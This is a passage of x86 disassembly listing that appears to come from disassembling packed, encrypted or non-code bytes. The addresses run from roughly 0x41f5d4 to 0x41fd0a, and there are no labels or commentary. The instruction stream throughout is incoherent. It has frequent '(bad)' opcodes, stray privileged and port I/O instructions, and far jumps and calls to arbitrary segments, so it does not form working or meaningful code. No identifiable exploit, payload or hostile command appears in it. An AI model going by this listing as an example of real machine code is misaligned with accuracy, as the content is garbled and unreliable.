  41f5d4:	push   ebx
  41f5d5:	mov    ebx,ss
  41f5d7:	jb     0x41f62a
  41f5d9:	(bad)  
  41f5da:	in     al,0x66
  41f5dc:	pop    edi
  41f5dd:	call   0xc9b2:0xf7a7b3d3
  41f5e4:	bound  eax,QWORD PTR [esi+0x15]
  41f5e7:	pop    edi
  41f5e8:	sahf   
  41f5e9:	pusha  
  41f5ea:	(bad)  
  41f5eb:	scas   eax,DWORD PTR es:[edi]
  41f5ec:	test   eax,0xd8e38d13
  41f5f1:	mov    WORD PTR [ebp+0x5e],gs
  41f5f4:	inc    ebp
  41f5f5:	jae    0x41f63b
  41f5f7:	or     eax,0x68040c7b
  41f5fc:	mov    dh,0x33
  41f5fe:	pop    ebx
  41f5ff:	sub    al,0xeb
  41f601:	sbb    al,BYTE PTR [ebp+ecx*1+0x5299541d]
  41f608:	repnz cli 
  41f60a:	scas   eax,DWORD PTR es:[edi]
  41f60b:	or     edi,DWORD PTR [ebx+0x3b078839]
  41f611:	test   DWORD PTR [edi],ecx
  41f613:	sbb    dl,BYTE PTR [eax+ebx*4+0x7b]
  41f617:	mov    bl,0x7f
  41f619:	dec    edi
  41f61a:	mov    ch,0xc0
  41f61c:	out    0xfc,eax
  41f61e:	je     0x41f5cf
  41f620:	pop    ebp
  41f621:	jl     0x41f695
  41f623:	pop    ds
  41f624:	bound  eax,QWORD PTR [eax]
  41f626:	stc    
  41f627:	adc    al,0x3f
  41f629:	cmp    BYTE PTR [ecx+0x7c718ae4],bh
  41f62f:	test   DWORD PTR [ebp-0x1c],ebp
  41f632:	xor    ch,bh
  41f634:	data16 mov cl,0x6a
  41f637:	imul   edx,DWORD PTR [ecx-0x51],0xffffff8a
  41f63b:	aas    
  41f63c:	cmp    eax,0x4ec05138
  41f641:	cs push ebx
  41f643:	out    dx,eax
  41f644:	sar    DWORD PTR [ebp-0x1d7d3ae0],0x7c
  41f64b:	mov    eax,0x17c33025
  41f650:	int    0x14
  41f652:	call   0xcea349ec
  41f657:	xor    ebp,ebx
  41f659:	pop    esi
  41f65a:	arpl   WORD PTR [esi-0x24c9e57d],cx
  41f660:	fistp  WORD PTR [eax-0x3f]
  41f663:	xor    BYTE PTR [ecx+0x49],al
  41f666:	or     al,0x13
  41f668:	outs   dx,BYTE PTR ds:[esi]
  41f669:	mul    DWORD PTR [eax-0x3a]
  41f66c:	adc    eax,0x498c9d15
  41f671:	xchg   esp,eax
  41f672:	jg     0x41f698
  41f674:	dec    esi
  41f675:	mov    ds:0xaa0b348,eax
  41f67a:	pop    ss
  41f67b:	loop   0x41f666
  41f67d:	(bad)  
  41f67e:	addr16 (bad) 
  41f680:	or     edx,DWORD PTR [esi]
  41f682:	push   ds
  41f683:	jl     0x41f6c7
  41f685:	jmp    0xe311d5ec
  41f68a:	or     ch,BYTE PTR [edx+0x50]
  41f68d:	sbb    ebx,DWORD PTR [ebp+0x6ee083b2]
  41f693:	push   0xb0b1b7d2
  41f698:	ds push ebp
  41f69a:	es ins BYTE PTR es:[edi],dx
  41f69c:	adc    DWORD PTR [esi-0x43770f96],ebx
  41f6a2:	mov    WORD PTR [ebx+0x47],es
  41f6a5:	fwait
  41f6a6:	clc    
  41f6a7:	push   ds
  41f6a8:	cld    
  41f6a9:	pop    esi
  41f6aa:	or     DWORD PTR [ebx-0x4b],ecx
  41f6ad:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41f6af:	shr    DWORD PTR [ebx],cl
  41f6b1:	jae    0x41f6ab
  41f6b3:	test   BYTE PTR [edi+0x1b],0xfc
  41f6b7:	iret   
  41f6b8:	cdq    
  41f6b9:	retf   0xfbe7
  41f6bc:	adc    eax,0x42110bc9
  41f6c1:	dec    ecx
  41f6c2:	lods   al,BYTE PTR ds:[esi]
  41f6c3:	fcomp  DWORD PTR [edi+0x14b2f1c7]
  41f6c9:	stos   DWORD PTR es:[edi],eax
  41f6ca:	inc    esi
  41f6cb:	dec    ecx
  41f6cd:	mov    ch,0x2
  41f6cf:	add    DWORD PTR [eax+0x5e998547],esp
  41f6d5:	cwde   
  41f6d6:	iret   
  41f6d7:	adc    al,0xe8
  41f6d9:	mov    ch,0x7d
  41f6db:	out    dx,eax
  41f6dc:	cld    
  41f6dd:	pop    ss
  41f6de:	daa    
  41f6df:	arpl   WORD PTR [ebp-0xf],si
  41f6e2:	dec    ebp
  41f6e3:	int    0xf2
  41f6e5:	push   edi
  41f6e6:	dec    ecx
  41f6e7:	push   ebp
  41f6e8:	rcr    cl,cl
  41f6ea:	dec    ebx
  41f6eb:	loope  0x41f6b3
  41f6ed:	jns    0x41f714
  41f6ef:	popa   
  41f6f0:	sbb    cl,BYTE PTR [ecx-0xc799eee]
  41f6f6:	pop    edx
  41f6f7:	test   BYTE PTR [edx+0x1f],dh
  41f6fa:	(bad)  
  41f6fb:	cmc    
  41f6fc:	inc    ebx
  41f6fd:	repnz add bl,BYTE PTR [ebp-0x3b]
  41f701:	out    0xc5,al
  41f703:	add    eax,ebx
  41f705:	xchg   edx,eax
  41f706:	mov    ebp,0x5c6459d2
  41f70b:	outs   dx,BYTE PTR ds:[esi]
  41f70c:	mov    ch,0x97
  41f70e:	sbb    bh,BYTE PTR [eax+0x5b153f6c]
  41f714:	imul   ebx,DWORD PTR [edx-0x1bffe3da],0xffffffb1
  41f71b:	fwait
  41f71c:	pop    edx
  41f71d:	xor    al,0xe
  41f71f:	mov    al,0x1e
  41f721:	jl     0x41f6d7
  41f723:	xor    BYTE PTR [eax],0x65
  41f726:	inc    eax
  41f727:	adc    al,0xae
  41f729:	loop   0x41f7a6
  41f72b:	mov    ds,WORD PTR [edi]
  41f72d:	or     eax,0x7501dc92
  41f732:	fcomp  DWORD PTR [ebp-0x68]
  41f735:	ins    DWORD PTR es:[edi],dx
  41f736:	mov    eax,0x722c828b
  41f73b:	xor    DWORD PTR [ebx+0x6b],0xfffffff0
  41f73f:	icebp  
  41f740:	xor    DWORD PTR [edx-0x1d],0xffffffd9
  41f744:	inc    edi
  41f745:	lods   eax,DWORD PTR ds:[esi]
  41f746:	mov    ds:0xf62bcc31,eax
  41f74b:	pop    ss
  41f74c:	mov    ch,0xd
  41f74e:	inc    ecx
  41f74f:	xor    DWORD PTR [ebp-0x3c],edx
  41f752:	imul   esp,DWORD PTR [ebx*8+0x2cf670e0],0xffffffed
  41f75a:	retf   0x61e9
  41f75d:	cmp    bl,dh
  41f75f:	out    0xfe,eax
  41f761:	cmp    ch,BYTE PTR [edx+0x22]
  41f764:	mov    cl,0x15
  41f766:	mov    edx,0x2058ab4a
  41f76b:	sahf   
  41f76c:	xlat   BYTE PTR ds:[ebx]
  41f76d:	sub    eax,0xc40aa609
  41f772:	out    dx,al
  41f773:	outs   dx,BYTE PTR ds:[esi]
  41f774:	adc    ch,BYTE PTR [edi+0x39]
  41f777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f778:	push   esp
  41f779:	mov    eax,0x400ee840
  41f77e:	lds    edx,FWORD PTR [edi]
  41f780:	inc    edx
  41f781:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f782:	ds shl dh,0x5c
  41f786:	std    
  41f787:	sbb    eax,0x1033c652
  41f78c:	fnsave [esi+0x1f2218e8]
  41f792:	sub    ebp,0x22
  41f795:	and    esi,DWORD PTR [esp+eax*8]
  41f798:	mov    ecx,0xeafd7ce9
  41f79d:	xor    eax,0xa56764d6
  41f7a2:	dec    ecx
  41f7a3:	aas    
  41f7a4:	scas   eax,DWORD PTR es:[edi]
  41f7a5:	shl    BYTE PTR [ebp+0x2b],1
  41f7a8:	js     0x41f7c8
  41f7aa:	int    0x1f
  41f7ac:	cmp    al,0xf0
  41f7ae:	outs   dx,DWORD PTR ds:[esi]
  41f7af:	push   es
  41f7b0:	jmp    DWORD PTR [esi+0x57]
  41f7b3:	jnp    0x41f800
  41f7b5:	mov    ecx,0x2d48d732
  41f7ba:	inc    edx
  41f7bb:	gs ss add al,0x89
  41f7bf:	pop    edi
  41f7c0:	push   edi
  41f7c1:	add    al,0x41
  41f7c3:	icebp  
  41f7c4:	pop    ds
  41f7c5:	xor    eax,0xc7490894
  41f7ca:	jl     0x41f74e
  41f7cc:	stc    
  41f7cd:	xchg   edi,eax
  41f7ce:	add    DWORD PTR [esi+0x79],0xb27ce9ab
  41f7d5:	xchg   ebx,eax
  41f7d6:	loope  0x41f801
  41f7d8:	push   edi
  41f7d9:	push   ds
  41f7da:	rsm    
  41f7dc:	addr16 mov dh,0x7f
  41f7df:	mov    ecx,DWORD PTR [esi]
  41f7e1:	dec    esp
  41f7e2:	mov    ecx,0xaf856e9
  41f7e7:	retf   
  41f7e8:	loopne 0x41f7a7
  41f7ea:	adc    ebp,DWORD PTR [bp+di]
  41f7ed:	pushf  
  41f7ee:	lahf   
  41f7ef:	mov    esp,0x475170eb
  41f7f4:	sbb    eax,0xd9239bc6
  41f7f9:	sahf   
  41f7fa:	push   ebx
  41f7fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7fc:	push   es
  41f7fd:	lea    esi,[edi-0x6f]
  41f800:	xor    eax,0x9089d4e0
  41f805:	mov    edx,0xde1c9964
  41f80a:	xchg   BYTE PTR [edx],cl
  41f80c:	cs add esp,ebx
  41f80f:	cmp    bh,BYTE PTR [edi]
  41f811:	mov    bl,0x45
  41f813:	outs   dx,DWORD PTR cs:[esi]
  41f815:	xor    eax,0xbace5188
  41f81a:	leave  
  41f81b:	fisttp DWORD PTR [edi+0x3433749d]
  41f821:	inc    eax
  41f822:	fsub   DWORD PTR [edi]
  41f824:	cmp    eax,0xd22026b1
  41f829:	xor    al,0xfa
  41f82b:	pushf  
  41f82c:	xor    BYTE PTR [ebp-0xe],0x6b
  41f830:	mov    eax,0xd0b1102f
  41f835:	lock inc edi
  41f837:	mov    al,0xd9
  41f839:	addr16 push esp
  41f83b:	mov    esi,0xd8a7884
  41f840:	add    edx,esi
  41f842:	jle    0x41f7df
  41f844:	jl     0x41f884
  41f846:	fistp  QWORD PTR [ebp+0x17]
  41f849:	add    al,0xe4
  41f84b:	std    
  41f84c:	rcr    BYTE PTR [eax-0x27b5661e],0x96
  41f853:	sbb    BYTE PTR [ebx+0x75],bl
  41f856:	xchg   esp,eax
  41f857:	cmp    eax,0x29a1f0b7
  41f85c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f85d:	adc    BYTE PTR [esi+0x2599bec9],dl
  41f863:	in     al,0xc
  41f865:	pop    eax
  41f866:	jge    0x41f84c
  41f868:	mov    ?,WORD PTR [ebx+0x2f]
  41f86b:	popa   
  41f86c:	cmp    BYTE PTR [ebx+0x6d],bl
  41f86f:	sub    ecx,DWORD PTR [ebx+0x40639a72]
  41f875:	jg     0x41f83f
  41f877:	(bad)  
  41f878:	jae    0x41f8b4
  41f87a:	mov    edx,0x82601d3
  41f87f:	loopne 0x41f89e
  41f881:	inc    edi
  41f882:	aad    0xb7
  41f884:	stos   DWORD PTR es:[edi],eax
  41f885:	retf   
  41f886:	data16 mov ch,0xe8
  41f889:	add    DWORD PTR [edx],esi
  41f88b:	ja     0x41f852
  41f88d:	add    ch,BYTE PTR [eax]
  41f88f:	sahf   
  41f890:	out    dx,eax
  41f891:	shl    DWORD PTR [edi-0x14e79a5d],0x64
  41f898:	inc    ebx
  41f899:	popf   
  41f89a:	pusha  
  41f89b:	mov    al,ds:0xe73a9cf1
  41f8a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8a1:	pop    eax
  41f8a2:	dec    ebp
  41f8a3:	dec    ebp
  41f8a4:	jnp    0x41f8d7
  41f8a6:	dec    edi
  41f8a7:	mov    ebp,0x45595a21
  41f8ac:	mov    ecx,0xd3a3397b
  41f8b1:	push   cs
  41f8b2:	mov    al,0x1
  41f8b4:	jne    0x41f927
  41f8b6:	pop    ebp
  41f8b7:	repz dec ebp
  41f8b9:	jge    0x41f8d7
  41f8bb:	sti    
  41f8bc:	dec    esp
  41f8bd:	mov    eax,ds:0x876e5685
  41f8c2:	or     al,0xdb
  41f8c4:	je     0x41f907
  41f8c6:	int3   
  41f8c7:	in     eax,dx
  41f8c8:	or     BYTE PTR [ecx-0xffa8a4c],dl
  41f8ce:	push   DWORD PTR [edx+0x7574f3c9]
  41f8d4:	daa    
  41f8d5:	jmp    0x622d:0xd17e3df8
  41f8dc:	mov    al,ds:0x213a1979
  41f8e1:	xor    ebp,DWORD PTR [edi-0x48]
  41f8e4:	cmp    al,0xb5
  41f8e6:	mov    DWORD PTR [eax],0xb802701
  41f8ec:	sub    edi,DWORD PTR [eax+0x38]
  41f8ef:	mov    ds,edx
  41f8f1:	rcr    BYTE PTR [eax],1
  41f8f3:	lods   al,BYTE PTR ds:[esi]
  41f8f4:	mov    ah,0xd
  41f8f6:	aaa    
  41f8f7:	mov    DWORD PTR [di+0x762d],ebp
  41f8fc:	push   es
  41f8fd:	(bad)
  41f901:	icebp  
  41f902:	retf   0xb048
  41f905:	or     bl,al
  41f907:	inc    edi
  41f908:	sub    eax,0x476adf6e
  41f90d:	cmc    
  41f90e:	push   ebp
  41f90f:	test   esp,0xba6d1ba9
  41f915:	inc    eax
  41f916:	add    eax,0x356d0afa
  41f91b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f91c:	jmp    0xa64fb151
  41f921:	fisttp WORD PTR [edi+0x19]
  41f924:	mov    esi,0x1b45207c
  41f929:	xor    eax,0x9effc799
  41f92e:	int    0x5e
  41f930:	lahf   
  41f931:	dec    esp
  41f932:	xchg   dl,dl
  41f934:	mov    al,ds:0xf9034118
  41f939:	mov    ebx,0x2c03c78d
  41f93e:	mov    bl,0xb
  41f940:	inc    esp
  41f941:	call   0xe6a9:0x7bac5f8e
  41f948:	add    ah,dl
  41f94a:	or     eax,0x9a70bd1c
  41f94f:	(bad)
  41f952:	lds    edx,FWORD PTR [esi+0x67bb3391]
  41f958:	leave  
  41f959:	add    cl,BYTE PTR [eax]
  41f95b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f95c:	mov    BYTE PTR [edi-0x27c84736],bl
  41f962:	retf   0x2a9c
  41f965:	fist   DWORD PTR [ebx-0x68e46bdd]
  41f96b:	add    al,0xbb
  41f96d:	mov    ch,0x4f
  41f96f:	mov    dl,0x7b
  41f971:	inc    ebx
  41f972:	loopne 0x41f998
  41f974:	ss (bad) 
  41f976:	jne    0x41f959
  41f978:	cwde   
  41f979:	les    eax,FWORD PTR [edi+0x7cf59359]
  41f97f:	(bad)  
  41f980:	hlt    
  41f981:	inc    ebx
  41f982:	fmul   QWORD PTR [ebx]
  41f984:	mov    ebp,0xeb3b977a
  41f989:	xor    al,0x27
  41f98b:	pusha  
  41f98c:	ret    0x66ad
  41f98f:	pop    esi
  41f990:	or     WORD PTR [ebp-0x5b94fb8e],0xffbb
  41f998:	push   0x33b0f9ce
  41f99d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f99e:	nop
  41f99f:	(bad)  
  41f9a0:	mov    ebx,0x1004cf7
  41f9a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9a6:	push   0xffffff84
  41f9a8:	add    BYTE PTR [edi],0x36
  41f9ab:	dec    esp
  41f9ac:	or     DWORD PTR [ecx+0x34],ebp
  41f9af:	mov    dh,0x3
  41f9b1:	nop
  41f9b2:	jmp    0xa9b2:0xc99776b4
  41f9b9:	ja     0x41fa3a
  41f9bb:	sbb    eax,0x1df76f46
  41f9c0:	js     0x41f9da
  41f9c2:	mov    cl,al
  41f9c4:	jne    0x41f962
  41f9c6:	jo     0x41f969
  41f9c8:	sahf   
  41f9c9:	inc    edi
  41f9ca:	not    BYTE PTR [edx+0x6d]
  41f9cd:	and    eax,0x92fbf9a
  41f9d2:	mov    al,0x75
  41f9d4:	jmp    0x7008:0xa6da9b9c
  41f9db:	pop    eax
  41f9dc:	js     0x41fa52
  41f9de:	pop    ss
  41f9df:	clc    
  41f9e0:	mov    ah,0x9e
  41f9e2:	mov    bl,0xc3
  41f9e4:	ror    edx,1
  41f9e6:	jmp    0x41f9c2
  41f9e8:	xchg   ebx,eax
  41f9e9:	aad    0x1e
  41f9eb:	lock es ret 
  41f9ee:	repz pushf 
  41f9f0:	fild   WORD PTR [ebp-0x32d7b48c]
  41f9f6:	or     BYTE PTR [eax],bl
  41f9f8:	cs xchg ebp,eax
  41f9fa:	jg     0x41fa19
  41f9fc:	mov    edx,0x43011183
  41fa01:	das    
  41fa02:	sub    al,0x8c
  41fa04:	and    BYTE PTR [edx-0x4d],bh
  41fa07:	mov    edx,0xa4d207
  41fa0c:	loopne 0x41f9ef
  41fa0e:	jb     0x41fa0b
  41fa10:	or     eax,0x14d5b360
  41fa15:	xchg   edx,eax
  41fa16:	ds xchg edx,eax
  41fa18:	jnp    0x41f9eb
  41fa1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa1b:	les    ebp,FWORD PTR [edi+0x492935a7]
  41fa21:	mov    esi,fs
  41fa23:	add    esp,ecx
  41fa25:	sbb    eax,0xeab8dd3c
  41fa2a:	jmp    0x41fa77
  41fa2c:	mov    WORD PTR [ecx+0x7f2dfcbe],gs
  41fa32:	jecxz  0x41fa90
  41fa34:	pushf  
  41fa35:	ret    0x49da
  41fa38:	sahf   
  41fa39:	repz imul ebx,DWORD PTR [ecx-0x2ee2d705],0x22
  41fa41:	(bad)  
  41fa42:	in     eax,0x7b
  41fa44:	push   edi
  41fa45:	and    edi,0x9ebe16b4
  41fa4b:	dec    edx
  41fa4c:	pop    ebx
  41fa4d:	cmc    
  41fa4e:	pop    edx
  41fa4f:	adc    ch,BYTE PTR [eax+0x23]
  41fa52:	xchg   edx,eax
  41fa53:	popf   
  41fa54:	leave  
  41fa55:	and    dl,BYTE PTR [eax]
  41fa57:	xchg   ebx,eax
  41fa58:	mov    esi,0x94f07c81
  41fa5d:	push   edx
  41fa5e:	add    DWORD PTR [edi],esi
  41fa60:	addr16 jns 0x41fa21
  41fa63:	jecxz  0x41f9f3
  41fa65:	loopne 0x41faa3
  41fa67:	sbb    BYTE PTR [edx-0x2dbe5866],0x6c
  41fa6e:	push   cs
  41fa6f:	lahf   
  41fa70:	(bad)  
  41fa72:	dec    edi
  41fa73:	dec    edx
  41fa74:	dec    edi
  41fa75:	fcom   DWORD PTR [esi]
  41fa77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa78:	ret    0x50b6
  41fa7b:	xor    ch,al
  41fa7d:	and    DWORD PTR [ebx-0x1f],0x40
  41fa81:	lods   al,BYTE PTR ds:[esi]
  41fa82:	add    ebp,DWORD PTR [esp+ecx*4+0x3c5451f3]
  41fa89:	out    dx,eax
  41fa8a:	or     ebx,DWORD PTR [esi]
  41fa8c:	fsub   QWORD PTR [esi+0x1882c185]
  41fa92:	mov    bl,0x8d
  41fa94:	cmc    
  41fa95:	xchg   BYTE PTR [ecx],ah
  41fa97:	pop    eax
  41fa98:	ret    0xeb41
  41fa9b:	sbb    eax,0xa35fdf25
  41faa0:	fisttp QWORD PTR [edi]
  41faa2:	out    0xc2,eax
  41faa4:	jbe    0x41fa9b
  41faa6:	int    0x1e
  41faa8:	aad    0x8b
  41faaa:	hlt    
  41faab:	mov    ds:0xa49eaf14,eax
  41fab0:	sbb    ah,BYTE PTR [ebp+eiz*2-0x1cfa140d]
  41fab7:	inc    esi
  41fab8:	mov    esi,0x88e5664b
  41fabd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fabf:	inc    edi
  41fac0:	popf   
  41fac1:	and    DWORD PTR [ebx-0x29],0xb618dba0
  41fac8:	sub    BYTE PTR [esi+0xd],cl
  41facb:	and    DWORD PTR [ebp-0x42],0xa4cd6f30
  41fad2:	mov    cl,0x1f
  41fad4:	jnp    0x41fa61
  41fad6:	jg     0x41fb51
  41fad8:	mov    ebx,0x9b2cb967
  41fadd:	push   ss
  41fade:	dec    edi
  41fadf:	mov    eax,ds:0x39f48d2a
  41fae4:	cmp    DWORD PTR [ebp+0x14],ecx
  41fae7:	cmp    al,0x37
  41fae9:	sbb    BYTE PTR [ecx+ecx*4+0x29],dl
  41faed:	pop    ecx
  41faee:	ror    BYTE PTR [ecx+0x62],cl
  41faf1:	xlat   BYTE PTR ds:[ebx]
  41faf2:	sub    DWORD PTR es:[eax],esi
  41faf5:	fdiv   st,st(3)
  41faf7:	mov    ebp,0xde4faa08
  41fafc:	xor    edi,esp
  41fafe:	les    edi,FWORD PTR [esi-0x3c]
  41fb01:	mov    ds:0x4f5afebe,al
  41fb06:	xchg   edx,eax
  41fb07:	pusha  
  41fb08:	in     eax,0x21
  41fb0a:	xchg   edi,eax
  41fb0b:	std    
  41fb0c:	test   BYTE PTR [ebp+0x5],0xdf
  41fb10:	in     eax,dx
  41fb11:	scas   al,BYTE PTR es:[edi]
  41fb12:	sub    ebp,ebp
  41fb14:	ja     0x41fb57
  41fb16:	test   DWORD PTR ss:[ecx+ebp*2],esp
  41fb1a:	out    dx,al
  41fb1b:	das    
  41fb1c:	imul   esp,DWORD PTR [ecx+0x6],0xffffffec
  41fb20:	dec    eax
  41fb21:	push   ebx
  41fb22:	jl     0x41fb4b
  41fb24:	out    dx,eax
  41fb25:	pop    eax
  41fb26:	(bad)  
  41fb27:	fimul  WORD PTR [edx+0x3a]
  41fb2a:	xchg   DWORD PTR [edi],edi
  41fb2c:	xor    al,0xce
  41fb2e:	add    edx,DWORD PTR [edx-0x3507f04b]
  41fb34:	shr    DWORD PTR [ebp-0x13],cl
  41fb37:	jle    0x41fb34
  41fb39:	and    edx,DWORD PTR [esi]
  41fb3b:	mov    bl,0x84
  41fb3d:	and    dl,cl
  41fb3f:	std    
  41fb40:	xlat   BYTE PTR ds:[ebx]
  41fb41:	div    DWORD PTR [ecx+0x353bd7af]
  41fb47:	mov    ebp,ebp
  41fb49:	test   al,0xd6
  41fb4b:	or     BYTE PTR [ebp-0x15e7cd08],cl
  41fb51:	ins    DWORD PTR es:[edi],dx
  41fb52:	ss retf 
  41fb54:	mov    bl,0xd9
  41fb56:	sbb    dh,BYTE PTR [edx+0x8]
  41fb59:	lods   eax,DWORD PTR ds:[esi]
  41fb5a:	cmp    edi,edx
  41fb5c:	minps  xmm2,XMMWORD PTR [ecx+0x2bdb317]
  41fb63:	popa   
  41fb64:	add    dh,ah
  41fb66:	sahf   
  41fb67:	mov    edi,0x295db089
  41fb6c:	lds    esi,FWORD PTR [edi]
  41fb6e:	xchg   dh,bl
  41fb70:	mov    bl,0x7c
  41fb72:	cmp    dl,BYTE PTR [ebp+0x66]
  41fb75:	add    ah,BYTE PTR [edi]
  41fb77:	cwde   
  41fb78:	bnd jo 0x41fb03
  41fb7b:	aas    
  41fb7c:	dec    esi
  41fb7d:	pop    ds
  41fb7e:	or     DWORD PTR ds:0x440a0b3e,edx
  41fb84:	fisubr DWORD PTR [ebp+0x4f]
  41fb87:	outs   dx,DWORD PTR ds:[esi]
  41fb88:	push   esi
  41fb89:	mov    gs,WORD PTR [edx]
  41fb8b:	addr16 icebp 
  41fb8d:	outs   dx,DWORD PTR ds:[esi]
  41fb8e:	(bad)  
  41fb8f:	cdq    
  41fb90:	(bad)  
  41fb91:	ficom  DWORD PTR [edx-0x13]
  41fb94:	or     dl,BYTE PTR [edi-0x4f]
  41fb97:	adc    DWORD PTR [eax+0x4c],ebx
  41fb9a:	adc    al,0x31
  41fb9c:	pop    es
  41fb9d:	inc    edi
  41fb9e:	sbb    DWORD PTR [esi-0x23],esp
  41fba1:	lahf   
  41fba2:	cmp    al,0xcb
  41fba4:	scas   eax,DWORD PTR es:[edi]
  41fba5:	jg     0x41fc03
  41fba7:	and    ah,cl
  41fba9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbaa:	mov    bl,BYTE PTR [edi+0x12]
  41fbad:	add    eax,0x249b02c2
  41fbb2:	shl    DWORD PTR [ebp+0x54],1
  41fbb5:	inc    edi
  41fbb6:	sbb    ebx,DWORD PTR [edx]
  41fbb8:	clc    
  41fbb9:	ss add edi,ecx
  41fbbc:	je     0x41fc37
  41fbbe:	jmp    0x41fb95
  41fbc0:	test   al,0xcd
  41fbc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbc3:	adc    al,0xe0
  41fbc5:	adc    DWORD PTR [eax+eiz*2-0x3565449a],ecx
  41fbcc:	sbb    al,0x65
  41fbce:	retf   0xc2ee
  41fbd1:	aam    0x25
  41fbd3:	inc    esp
  41fbd4:	aas    
  41fbd5:	imul   edx,DWORD PTR [eax-0x36147832],0xeb24e284
  41fbdf:	lock jnp 0x41fc1c
  41fbe2:	jl     0x41fb8b
  41fbe4:	xchg   ebp,eax
  41fbe5:	cdq    
  41fbe6:	(bad)  
  41fbe8:	xor    ecx,edx
  41fbea:	push   ss
  41fbeb:	xchg   BYTE PTR [ebp-0x4c],dl
  41fbee:	fwait
  41fbef:	add    al,0x3
  41fbf1:	or     DWORD PTR [esi-0x66],edi
  41fbf4:	stos   DWORD PTR es:[edi],eax
  41fbf5:	push   esi
  41fbf6:	xchg   ecx,eax
  41fbf7:	je     0x41fc55
  41fbf9:	lahf   
  41fbfa:	mov    cl,0x37
  41fbfc:	xchg   edx,eax
  41fbfd:	es popa 
  41fbff:	fsubr  QWORD PTR [esp+esi*8+0xaa80c6d]
  41fc06:	or     DWORD PTR [ecx-0x5b3f9b37],esp
  41fc0c:	in     eax,0xda
  41fc0e:	cdq    
  41fc0f:	push   ss
  41fc10:	cmp    al,0x37
  41fc12:	daa    
  41fc13:	inc    ecx
  41fc14:	cmp    BYTE PTR [edx],cl
  41fc16:	sbb    esi,DWORD PTR ss:[edx-0x7d]
  41fc1a:	int    0x5
  41fc1c:	inc    esp
  41fc1d:	lods   al,BYTE PTR ds:[esi]
  41fc1e:	sti    
  41fc1f:	inc    ecx
  41fc20:	xor    DWORD PTR [edx],ebp
  41fc22:	or     BYTE PTR [ecx+0x6340e600],ch
  41fc28:	sub    eax,0xd62370c6
  41fc2d:	int3   
  41fc2e:	call   0x6ecb8421
  41fc33:	rcl    al,1
  41fc35:	dec    edx
  41fc36:	dec    ebp
  41fc37:	std    
  41fc38:	mov    ebp,0x88954307
  41fc3d:	adc    bl,cl
  41fc3f:	cmp    cl,dl
  41fc41:	mov    ecx,0x6f492b4a
  41fc46:	add    DWORD PTR [edx-0x24],ebp
  41fc49:	jnp    0x41fcc4
  41fc4b:	mov    ds:0x78fdbd14,al
  41fc50:	jns    0x41fc75
  41fc52:	(bad)  
  41fc53:	clc    
  41fc54:	in     al,0x5
  41fc56:	jae    0x41fc29
  41fc58:	in     al,0x58
  41fc5a:	sbb    BYTE PTR [edi-0x74a0a0e3],0x7a
  41fc61:	pusha  
  41fc62:	hlt    
  41fc63:	cmp    ah,BYTE PTR [ebp+0x4a]
  41fc66:	(bad)  
  41fc67:	jecxz  0x41fc78
  41fc69:	stos   DWORD PTR es:[di],eax
  41fc6b:	push   ebx
  41fc6c:	inc    esp
  41fc6d:	retf   0xc5aa
  41fc70:	jmp    0x3da6:0xd52520e0
  41fc77:	xor    al,0x1a
  41fc79:	jno    0x41fc94
  41fc7b:	fxch   st(2)
  41fc7d:	icebp  
  41fc7e:	(bad)  
  41fc7f:	adc    esp,DWORD PTR [esi]
  41fc81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc82:	jg     0x41fc99
  41fc84:	aas    
  41fc85:	ins    DWORD PTR es:[edi],dx
  41fc86:	sub    al,0xe8
  41fc88:	jl     0x41fc5b
  41fc8a:	pop    ecx
  41fc8b:	pop    ss
  41fc8c:	adc    ah,ah
  41fc8e:	inc    edi
  41fc8f:	xchg   DWORD PTR [edx],esp
  41fc91:	jecxz  0x41fcfe
  41fc93:	xchg   ebp,eax
  41fc94:	test   DWORD PTR [ebx-0x3377c409],0xaa8cf3e6
  41fc9e:	xchg   ebx,eax
  41fc9f:	jns    0x41fc5a
  41fca1:	xchg   BYTE PTR [edx],dh
  41fca3:	(bad)  
  41fca4:	fcom   QWORD PTR [edx]
  41fca6:	and    BYTE PTR [esi+0x37d3302f],bh
  41fcac:	mov    cl,0x6f
  41fcae:	sbb    al,0xb1
  41fcb0:	add    bh,ch
  41fcb2:	mov    edx,0x328d6c85
  41fcb7:	pop    esp
  41fcb8:	add    cl,BYTE PTR [ebx-0x8cb0638]
  41fcbe:	xor    DWORD PTR [ecx-0x27],ebp
  41fcc1:	and    edx,DWORD PTR [edx+0x18]
  41fcc4:	outs   dx,DWORD PTR ds:[esi]
  41fcc5:	call   0xdc68:0xfdc619cc
  41fccc:	call   0xd743e73c
  41fcd1:	out    dx,eax
  41fcd2:	push   ebx
  41fcd4:	ins    BYTE PTR es:[edi],dx
  41fcd5:	cmp    BYTE PTR [ecx+0x73],bh
  41fcd8:	xchg   ch,cl
  41fcda:	test   eax,0x4beceb04
  41fcdf:	cmp    ebx,ecx
  41fce1:	add    BYTE PTR [esi-0x7b],0x2
  41fce5:	and    eax,0x2cd039ad
  41fcea:	mov    bl,0x67
  41fcec:	pop    esp
  41fced:	popa   
  41fcee:	(bad)  
  41fcef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fcf0:	mov    bh,0xb2
  41fcf2:	inc    esi
  41fcf3:	frstor [ecx-0x48f71e52]
  41fcf9:	loope  0x41fcc9
  41fcfb:	stc    
  41fcfc:	mov    ds:0x9b3039e8,al
  41fd01:	xor    BYTE PTR [esi],0x9
  41fd04:	stos   BYTE PTR es:[edi],al
  41fd05:	jge    0x41fd1e
  41fd07:	ret    
  41fd08:	adc    BYTE PTR [ecx],dl
  41fd0a:	ins    BYTE PTR es:[edi],dx
